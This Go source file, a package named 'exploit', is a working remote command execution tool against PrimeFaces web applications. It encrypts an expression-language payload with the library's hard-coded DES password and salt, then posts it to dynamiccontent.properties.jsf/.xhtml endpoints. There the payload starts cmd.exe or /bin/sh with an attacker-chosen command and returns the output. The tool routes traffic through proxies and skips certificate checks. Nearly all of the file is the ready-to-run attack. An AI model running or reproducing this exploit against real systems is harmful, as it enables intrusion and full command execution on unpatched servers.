package exploit

import (
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"io"
	"crypto/tls"

	"h12.io/socks"
	"github.com/fatih/color"
)

func _error(err interface{}) {

	if err != nil {
		log.Fatalln(err)
		os.Exit(0)
	}

}

func TargetConnect(TargetUrl, Cmd, proxy string, stdin bool) {
	
	connectMsg := color.New(color.FgYellow).Add(color.Bold)
	statusCodeMsg := color.New(color.FgYellow).Add(color.Bold)

	connectMsg.Println("[!] Trying to connect to", TargetUrl)
 
    var hc *http.Client // defining the http.Client variable

    if len(proxy) != 0 && strings.Contains(proxy, "http") == false { // only socks4/socks4a/socks5 accepted here
        dialSocksProxy := socks.Dial(proxy)

        hc = &http.Client{
            Transport: &http.Transport{
                Dial: dialSocksProxy, // add proxy in request
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignoring bad certificate error
            },
            }

    } else if len(proxy) != 0 && strings.Contains(proxy, "http") == true { // check if proxy have "http" in schema
        proxyURL, _ := url.Parse(proxy)
        proxy := http.ProxyURL(proxyURL)

        hc = &http.Client{
            Transport: &http.Transport{
                Proxy: proxy, // add proxy in request
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignoring bad certificate error
            },
            }

    } else { // no proxy :P
        hc = &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
    }
    

	res, err := http.NewRequest("GET", TargetUrl, nil)
	_error(err)

	connectResponse, err := hc.Do(res)
	_error(err)

	statusCodeMsg.Println("[!] Got status code:", connectResponse.StatusCode)

	Exploit(TargetUrl, Cmd, proxy, stdin)

}

func getDerivedKey(password string, salt []byte, count int) ([]byte, []byte) {
	key := md5.Sum([]byte(password + string(salt)))
	for i := 0; i < count - 1; i++ {
		key = md5.Sum(key[:])
	}
	return key[:8], key[8:]
}

func Encrypt(password string, obtenationIterations int, plainText string, salt []byte) (string, error) {
	padNum := byte(8 - len(plainText) % 8)
	for i := byte(0); i < padNum; i++ {
		plainText += string(padNum)
	}

	dk, iv := getDerivedKey(password, salt, obtenationIterations)

	block,err := des.NewCipher(dk)

	if err != nil {
		return "", err
	}

	encrypter := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(plainText))
	encrypter.CryptBlocks(encrypted, []byte(plainText))

	return base64.StdEncoding.EncodeToString(encrypted), nil
}

func Exploit(TargetUrl, Cmd, proxy string, stdin bool) {
	password := "primefaces"
	salt := []byte{0xA9, 0x9B, 0xC8, 0x32, 0x56, 0x34, 0xE3, 0x03} // \xA9\x9B\xC8\x32\x56\x34\xE3\x03
	iterations := 19

	fullPayload := `${session.setAttribute("scriptfactory",facesContext.getExternalContext().getClass().getClassLoader().loadClass("javax.script.ScriptEngineManager").newInstance())}${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}${session.getAttribute("scriptengine").eval("var os = java.lang.System.getProperty(\"os.name\");var proc = null;os.toLowerCase().contains(\"win\")? proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/C\",\"".concat(request.getParameter("cmd")).concat("\"]).start() : proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"").concat(request.getParameter("cmd")).concat("\"]).start();var is = proc.getInputStream();var sc = new java.util.Scanner(is,\"UTF-8\"); var out = \"\";while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}print(out);"))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()}`

	res, err := Encrypt(password, iterations, fullPayload, salt)
	_error(err)

	if stdin == false {

		payloadMsg := color.New(color.FgCyan).Add(color.Bold)
		payloadMsg.Println("[+] Encrypted Payload:", res)
	}

	commandMsg := color.New(color.FgYellow).Add(color.Bold)
	commandMsg.Println("[!] Attemping to execute:", Cmd)

	var hc *http.Client // defining the http.Client variable

	if len(proxy) != 0 && strings.Contains(proxy, "http") == false { // only socks4/socks4a/socks5 accepted here
		dialSocksProxy := socks.Dial(proxy)

		hc = &http.Client{
			Transport: &http.Transport{
				Dial: dialSocksProxy, // add proxy in request
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignoring bad certificate error
			},
	}


	} else if len(proxy) != 0 && strings.Contains(proxy, "http") == true { // check if proxy have "http" in schema
		proxyURL, _ := url.Parse(proxy)
		proxy := http.ProxyURL(proxyURL)

		hc = &http.Client{
			Transport: &http.Transport{
				Proxy: proxy, // add proxy in request 
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignoring bad certificate error
			},
	}

	} else { // no proxy :P
		hc = &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}} 
    }

	form := url.Values{}
	form.Add("pfdrt", "sc")
	form.Add("ln", "primefaces")
	form.Add("pfdrid", res)
	form.Add("cmd", Cmd)

	jsfUrl := TargetUrl + "javax.faces.resource/dynamiccontent.properties.jsf"
	xhtmlUrl := TargetUrl + "javax.faces.resource/dynamiccontent.properties.xhtml"

	urlsPath := []string{jsfUrl, xhtmlUrl}

	pathsWarnMsg := color.New(color.FgYellow).Add(color.Bold)
	pathsWarnMsg.Println("[!] Trying in dynamiccontent.properties.jsf and dynamiccontent.properties.xhtml\n")

	for _, value := range urlsPath {

		req, err := http.NewRequest("POST", value, strings.NewReader(form.Encode()))

		req.PostForm = form
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err := hc.Do(req)
		_error(err)

		body, err := io.ReadAll(resp.Body)
		_error(err)
		bodyResponse := string(body)

		if strings.Contains(bodyResponse, "<!") == false{ // checking if response have "<!" string -> if false, print result *probably rce output*
			fmt.Println("\n",bodyResponse)
		} else {
			pathsWarnMsg := color.New(color.FgRed).Add(color.Bold)
			pathsWarnMsg.Println("[!] Can't check command output. Target may not vulnerable.")
		}
	}
	fmt.Println("") // new line for stdins inputs
}
